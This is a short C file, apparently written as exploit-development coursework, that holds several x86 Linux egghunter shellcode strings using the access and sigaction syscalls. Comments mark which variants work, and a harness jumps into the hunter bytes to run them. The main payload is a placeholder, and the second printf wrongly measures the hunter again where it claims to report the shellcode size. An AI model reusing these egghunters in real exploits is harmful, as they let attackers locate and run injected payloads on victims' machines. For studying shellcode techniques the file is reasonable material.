/*
 egghunter.c
 Tim Ip
*/

#include <stdio.h>
#include <string.h>


unsigned char shellcode[] = "\x90\x50\x90\x50\x90\x50\x90\x50" //egg
"PUT YOUR SHELLCODE HERE";

// Hunter 1: access
// unsigned char hunter[] = "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

// Hunter 2: access-revisit (not working - Incorrect mode / non-zero ECX)
// unsigned char hunter[] = "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

// Hunter 2: access-revisit (working - zeroed ECX)
// unsigned char hunter[] = "\x31\xd2\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

// Hunter 3: sigaction (not working - SegFault at ECX=0x0)
// unsigned char hunter[] = "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

// Hunter 3: sigaction (working - bypass ECX=0x0)
unsigned char hunter[] = "\x66\x81\xc9\xff\x0f\x41\x75\x01\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

int main() {
    printf("Hunter size: %d\n", strlen(hunter));
    printf("Shellcode size: %d\n", strlen(hunter));

    printf("Egg is at %p\n", shellcode);
    int (*ret)() = (int(*)())hunter;
    ret();
}
